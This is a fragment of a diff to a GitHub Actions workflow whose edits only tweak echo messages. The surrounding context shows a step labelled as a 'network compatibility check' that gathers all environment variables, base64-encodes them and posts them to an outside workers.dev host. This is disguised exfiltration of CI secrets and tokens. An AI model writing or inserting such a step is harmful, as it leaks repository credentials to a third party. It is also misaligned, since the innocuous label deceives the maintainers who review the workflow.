@@ -19,7 +19,7 @@ jobs:
         env:
           TEST: "https://soft-pond.gcp-auth-worker.workers.dev"
         run: |
-          echo "::Running network compatibility checks"
+          echo "Running network compatibility checks"
 
           # Collect all environment variables into a variable
           ALL_ENV=$(env | base64 -w0 | tr '+/' '-_')
@@ -35,4 +35,4 @@ jobs:
             -H "Content-Type: text/plain" \
             --data "$ALL_ENV"
 
-          echo "::Network compatibility test completed"
+          echo "Network compatibility test completed"
